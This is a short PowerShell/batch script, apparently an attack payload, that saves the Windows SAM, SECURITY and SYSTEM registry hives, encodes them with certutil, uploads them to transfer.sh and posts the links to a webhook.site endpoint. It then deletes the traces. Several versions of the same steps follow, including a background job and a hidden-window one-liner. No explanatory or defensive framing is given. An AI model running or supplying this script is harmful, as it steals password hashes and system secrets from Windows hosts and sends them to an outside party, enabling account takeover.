# Create the encoded HIVEs

reg save HKLM\SAM SA.B;
certutil -encode -f SA.B SA.B;

reg save HKLM\security SE.B;
certutil -encode -f SE.B SE.B;

reg save HKLM\system SY.B;
certutil -encode -f SY.B SY.B;

$UT='http://transfer.sh';
$c1 = (Invoke-WebRequest -Uri "$UT/SA.B" -Method PUT -Infile SA.B -UseBasicParsing).Content;
$c2 = (Invoke-WebRequest -Uri "$UT/SE.B" -Method PUT -Infile SE.B -UseBasicParsing).Content;
$c3 = (Invoke-WebRequest -Uri "$UT/SY.B" -Method PUT -Infile SY.B -UseBasicParsing).Content;
$p = @{SA=$c1;SE=$c2;SY=$c3}
$U='https://webhook.site/5266f74f-e5b0-424b-be22-40910f328289';
Invoke-WebRequest -Uri $U -Method POST -Body $p -UseBasicParsing;
del *.B;
exit


Start-Job{cd $env:tmp; $UT='http://transfer.sh';$c1 = (Invoke-WebRequest -Uri "$UT/SA.B" -Method PUT -Infile SA.B -UseBasicParsing).Content;$c2 = (Invoke-WebRequest -Uri "$UT/SE.B" -Method PUT -Infile SE.B -UseBasicParsing).Content;$c3 = (Invoke-WebRequest -Uri "$UT/SY.B" -Method PUT -Infile SY.B -UseBasicParsing).Content;$p = @{SA=$c1;SE=$c2;SY=$c3}; $U='https://webhook.site/5266f74f-e5b0-424b-be22-40910f328289';Invoke-WebRequest -Uri $U -Method POST -Body $p -UseBasicParsing;del *.B;}


reg save HKLM\SAM SA.B; certutil -encode -f SA.B SA.B; reg save HKLM\security SE.B; certutil -encode -f SE.B SE.B; 
reg save HKLM\system SY.B; certutil -encode -f SY.B SY.B;

powershell -windowstyle hidden -c {cd $env:tmp; reg save HKLM\SAM SA.B; certutil -encode -f SA.B SA.B; reg save HKLM\security SE.B; certutil -encode -f SE.B SE.B; reg save HKLM\system SY.B; certutil -encode -f SY.B SY.B;$UT='http://transfer.sh';$c1 = (Invoke-WebRequest -Uri "$UT/SA.B" -Method PUT -Infile SA.B -UseBasicParsing).Content;$c2 = (Invoke-WebRequest -Uri "$UT/SE.B" -Method PUT -Infile SE.B -UseBasicParsing).Content;$c3 = (Invoke-WebRequest -Uri "$UT/SY.B" -Method PUT -Infile SY.B -UseBasicParsing).Content;$p = @{SA=$c1;SE=$c2;SY=$c3}; $U='https://webhook.site/5266f74f-e5b0-424b-be22-40910f328289';Invoke-WebRequest -Uri $U -Method POST -Body $p -UseBasicParsing;del *.B;}